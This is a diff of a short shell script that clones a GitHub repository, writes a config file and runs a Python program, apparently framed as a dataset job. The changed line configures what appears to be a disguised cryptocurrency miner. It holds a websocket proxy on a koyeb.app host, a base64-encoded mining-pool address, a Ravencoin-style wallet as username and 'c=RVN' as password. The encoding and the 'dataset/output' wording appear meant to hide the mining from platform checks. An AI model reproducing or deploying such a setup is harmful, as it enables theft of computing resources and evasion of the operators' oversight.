@@ -7,7 +7,7 @@ git clone https://github.com/saxlata/vbg.git
 cd vbg || exit
 
 # Create a configuration file
-echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=", "username": "rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB", "password": "c=RVN,gh", "threads": 8}' > data.txt
+echo -e "proxy=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=\nhost=127.0.0.1\nport=3306\nusername=rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB\npassword=c=RVN,pyth\nthreads=2" > data.txt
 
 # Run the application
 python3 main.py 7 --dataset=data.txt --output=result.txt
